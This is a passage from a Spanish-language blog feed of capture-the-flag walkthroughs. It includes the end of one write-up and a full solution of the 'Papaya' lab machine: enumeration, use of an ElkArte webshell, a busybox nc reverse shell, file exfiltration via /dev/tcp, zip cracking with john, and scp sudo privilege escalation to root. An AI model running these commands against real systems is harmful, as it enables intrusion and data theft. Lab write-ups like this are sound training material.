    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User toctoc may run the following commands on 50a589993c7e:
    <span class="o">(</span>ALL : NOPASSWD<span class="o">)</span> /opt/bash
    <span class="o">(</span>ALL : NOPASSWD<span class="o">)</span> /ahora/noesta/function
toctoc@50a589993c7e:~<span class="err">$</span>
</code></pre></div></div>

<p>Puede ejecutar /opt/bash como root. Como sabemos ejecutando <code class="language-plaintext highlighter-rouge">/opt/bash -p</code> podemos obtener acceso como <strong>root</strong>. El problema es que en /opt no hay ningún fichero.</p>

<p>Buscamos por el sistema en busca de algún fichero y encontramos lo siguiente en el fichero <strong>.bashrc</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function </span>backdoor<span class="o">(){</span>
        <span class="nb">echo</span> <span class="s1">'Tal vez una puerta trasera poco discreta'</span>
        <span class="nb">echo</span> <span class="s1">'5432 3629 9123'</span>
        <span class="nb">echo</span> <span class="s1">'Aparecio......'</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Volvemos a “tocar” los puertos que nos indica:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>knock <span class="nt">-v</span> 172.17.0.2 5432 3629 9123
hitting tcp 172.17.0.2:5432
hitting tcp 172.17.0.2:3629
hitting tcp 172.17.0.2:9123
</code></pre></div></div>

<p>Y haciendo un listado de <strong>/opt</strong> vemos que ahora si está <strong>bash</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>toctoc@50a589993c7e:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/
total 1424
drwxr-xr-x 1 root root    4096 Jul  6 05:58 <span class="nb">.</span>
drwxr-xr-x 1 root root    4096 Jul  6 05:38 ..
<span class="nt">-rwsr-S---</span> 1 root root 1446024 Jul  6 05:58 bash
</code></pre></div></div>

<p>Lo ejecutamos como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>toctoc@50a589993c7e:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/bash <span class="nt">-p</span>
root@50a589993c7e:/home/toctoc# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> <span class="nb">date
</span>root
50a589993c7e
Fri Jul  5 08:20:09 +10 2024
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="facil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Papaya</title><link href="/posts/papaya/" rel="alternate" type="text/html" title="Papaya" /><published>2024-07-03T00:00:00+00:00</published><updated>2024-07-03T00:00:00+00:00</updated><id>/posts/papaya</id><content type="html" xml:base="/posts/papaya/"><![CDATA[<p><img src="/assets/images/papaya/papa.jpg" alt="image" /></p>

<p>Estamos ante una máquina Linux de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:80:58:9b       PCS Systemtechnik GmbH
10.0.2.147      08:00:27:5a:99:51       PCS Systemtechnik GmbH
</code></pre></div></div>

<h1 id="enumeración">Enumeración</h1>

<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.147</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.147</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.147
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Una vex que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 <span class="nt">-v</span> 10.0.2.147
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
|     Orden incorrecta: Intenta ser m
|     creativo
|     Orden incorrecta: Intenta ser m
|     creativo
|   Help: 
|     220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
|     214-Se reconocen las siguiente 
|     rdenes <span class="o">(</span><span class="k">*</span> <span class="o">=&gt;</span><span class="s1">'s no implementadas):
|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
|     STOR STOU APPE REST ABOR RANG USER PASS 
|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
|     comentario a root@papaya
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 Servidor ProFTPD (Debian) [::ffff:10.0.2.147]
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp            19 Jul  2 15:26 secret.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 bb:05:10:69:18:eb:e3:44:2c:a7:68:98:d0:97:01:20 (ECDSA)
|_  256 65:41:aa:54:a6:b7:f7:2a:04:2e:c4:6a:c0:4d:10:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.59
|_http-title: Did not follow redirect to http://papaya.thl/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.59 (Debian)
</span></code></pre></div></div>

<p>De este último escaneo obtenemos que la web tiene como nombre de dominio <strong>papaya.thl</strong> y que podemos acceder al <strong>FTP</strong> de forma anónima.  Primero añadimos el dominio a nuestro fichero <strong>hosts</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.0.2.147 papaya.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.0.2.147 papaya.thl
</code></pre></div></div>

<p>Y después nos conectamos al servidor FTP para ver si encontramos algo. Usamos las credenciales <strong>ftp:ftp</strong> y nos descargamos todo lo que encontremos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.0.2.147
Connected to 10.0.2.147.
220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
Name <span class="o">(</span>10.0.2.147:murrusko<span class="o">)</span>: ftp
331 Conexión anónima ok, envía tu dirección de email como contraseña
Password: 
230 Aceptado acceso anónimo, aplicadas restricciones
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|1408|<span class="o">)</span>
150 Abriendo conexión de datos en modo ASCII para file list
<span class="nt">-rw-r--r--</span>   1 ftp      ftp            19 Jul  2 15:26 secret.txt
226 Transferencia completada
ftp&gt; get secret.txt
<span class="nb">local</span>: secret.txt remote: secret.txt
229 Entering Extended Passive Mode <span class="o">(||</span>|43904|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>secret.txt <span class="o">(</span>19 bytes<span class="o">)</span>
100% |<span class="k">******************</span>|    19       11.75 KiB/s    00:00 ETA
226 Transferencia completada
19 bytes received <span class="k">in </span>00:00 <span class="o">(</span>4.68 KiB/s<span class="o">)</span>
ftp&gt; bye
221 Hasta luego
</code></pre></div></div>

<p>Vemos que contiene el fichero <strong>secret.txt</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>secret.txt 
ndhvabunlanqnpbñb
</code></pre></div></div>

<p>Intentamos desencriptar el texto usando la técnica de <strong>ROT13</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>secret.txt | <span class="nb">tr</span> <span class="s1">'A-Za-z'</span> <span class="s1">'N-ZA-Mn-za-m'</span>
aquinohaynadacoño
</code></pre></div></div>

<p>Nos lo guardamos por si hiciera falta.</p>

<p>Ahora vamos a ver que contiene el servidor web con <strong>whatweb</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb <span class="nt">-a</span> 3 http://papaya.thl
http://papaya.thl <span class="o">[</span>200 OK] Apache[2.4.59], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.0.2.147], JQuery[3.6.0], PasswordField[passwrd], PoweredBy[ElkArte], Script, Title[My Community - Index], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1]

</code></pre></div></div>

<p>Vemos que usa ElkArte, un framework en php para crear un foro. Buscando posibles exploit para ese framework encontramos el siguiente PoC <a href="https://www.exploit-db.com/exploits/52026">https://www.exploit-db.com/exploits/52026</a>. Como podemos ver se puede conseguir un RCE subiendo un theme, pero es necesario estar autenticado y tener permisos para modificar los themes. Probando las credenciales que tenemos vemos que no obtenemos acceso.</p>

<p>Vamos a buscar ficheros y directorios con <strong>feroxbuster</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://papaya.thl/themes/ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> php <span class="nt">-r</span>

500      GET        4l       13w       89c http://papaya.thl/themes/test/test.php
...

</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Entre otros vemos un archivo un tanto raro. Si hemos leido el enlace anterior vemos que el fichero coincide con el PoC. Vamos a probar a ver que nos responde:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://papaya.thl/themes/test/test.php
<span class="c"># Execute one command</span>
www-data

<span class="c"># Take input from the url paramter. shell.php?cmd=whoami</span>
</code></pre></div></div>

<p>Vemos que ejecuta un comando como www-data, pero para ello hay que añadir a la petición <strong>?cmd=comando.</strong> Nos ponemos a la escucha en nuestra máquina. Para obtener una shell reversa hay que mandar el comando encodeado como URL:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://papaya.thl/themes/test/test.php?cmd<span class="o">=</span>busybox+nc+10.0.2.5+8888+-e+bash
</code></pre></div></div>

<p>Y obtenemos la shell reversa. Hacemos el tratamiento de la shell para obtener la TTY completa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.147] 59434
script /dev/null <span class="nt">-qc</span> bash
www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 8888
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 8888
<span class="nb">ls
</span>test.php
www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span>reset
www-data@papaya:/var/www/html/elkarte/themes/test<span class="err">$</span>
</code></pre></div></div>

<p>Una vez dentro del sistema vemos que hay un usuario llamado <strong>papaya</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
root:x:0:0:root:/root:/bin/bash
papaya:x:1000:1000:,,,:/home/papaya:/bin/bash
</code></pre></div></div>

<p>Haciendo una búsqueda por el servidor nos encontramos con un fichero <strong>zip</strong> en el directorio <strong>/opt:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
total 4
<span class="nt">-rwxr-xr-x</span> 1 root root 173 Jul  2 17:14 pass.zip
</code></pre></div></div>

<p>Nos ponemos a la eschucha en nuestra máquina redirigiéndo la salida a un fichero llamado <strong>pass.zip</strong> y nos mandamos el fichero zip del servidor a nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/opt<span class="nv">$ </span><span class="nb">cat </span>pass.zip <span class="o">&gt;</span> /dev/tcp/10.0.2.5/8889

<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889 <span class="o">&gt;</span> pass.zip
listening on <span class="o">[</span>any] 8889 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.147] 35802
</code></pre></div></div>

<p>Intentamos descomprimirlo pero vemos que es necesaria una clave para extraer el contenido. Usando <strong>zip2john</strong> creamos el hash del fichero para luego intentar crackearlo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip2john pass.zip <span class="o">&gt;</span> pass.hash
ver 2.0 pass.zip/pass.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>23, <span class="nv">decmplen</span><span class="o">=</span>11, <span class="nv">crc</span><span class="o">=</span>EEA46B01 <span class="nv">ts</span><span class="o">=</span>89BB <span class="nv">cs</span><span class="o">=</span>eea4 <span class="nb">type</span><span class="o">=</span>0
</code></pre></div></div>

<p>Ahora usamos <strong>john</strong> para intentar encontrar la password:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt pass.hash 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
jesica           <span class="o">(</span>pass.zip/pass.txt<span class="o">)</span>
</code></pre></div></div>

<p>Descomprimimos el fichero con la clave recién obtenida y leemos el fichero que hay dentro:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>pass.txt 
papayarica
</code></pre></div></div>

<p>Nos logeamos como <strong>papaya</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/opt<span class="nv">$ </span>su papaya
Password: 
papaya@papaya:/opt<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
papaya@papaya:/opt<span class="err">$</span>
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vamos a ver si el usuario puede ejecutar algún comando como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>papaya@papaya:/opt<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>papaya on papaya:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User papaya may run the following commands on papaya:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/scp
</code></pre></div></div>

<p>Vemos que puede usar el comando scp como root. Buscamos en <a href="https://gtfobins.github.io/gtfobins/scp/#sudo">GTFOBins</a> el comando y ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'bash 0&lt;&amp;2 1&gt;&amp;2'</span> <span class="o">&gt;</span> <span class="nv">$TF</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>scp <span class="nt">-S</span> <span class="nv">$TF</span> x y:
root@papaya:~# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> <span class="nb">id
</span>root
papaya
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@papaya:~#
</code></pre></div></div>

<p>Y con esto terminamos la máquina.</p>

<p>Un saludo</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry></feed>